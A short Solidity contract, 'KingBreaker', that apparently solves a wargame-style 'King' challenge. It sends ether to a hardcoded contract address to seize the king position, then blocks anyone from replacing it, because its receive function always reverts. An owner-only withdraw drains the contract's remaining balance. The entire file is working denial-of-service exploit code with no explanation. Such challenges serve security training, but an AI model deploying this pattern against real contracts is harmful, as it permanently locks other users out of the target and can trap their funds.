// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingBreaker {
	address king = 0xb26474A417d73A3C9BB3CEACfe5b898AB234Ad43;
	address public owner;

	constructor () payable{
		owner = msg.sender;
	}

	function becomeKing() public {
		(bool ok,) = king.call{value: 1500000000000000 wei}("");
		require(ok, "Failed");
	}

	function withdraw () public {
		require(msg.sender == owner);
		(bool ok,) = msg.sender.call{value: address(this).balance}("");
		require(ok, "Failed");
	}

	receive () external payable {
		revert("No can do...");
	}
}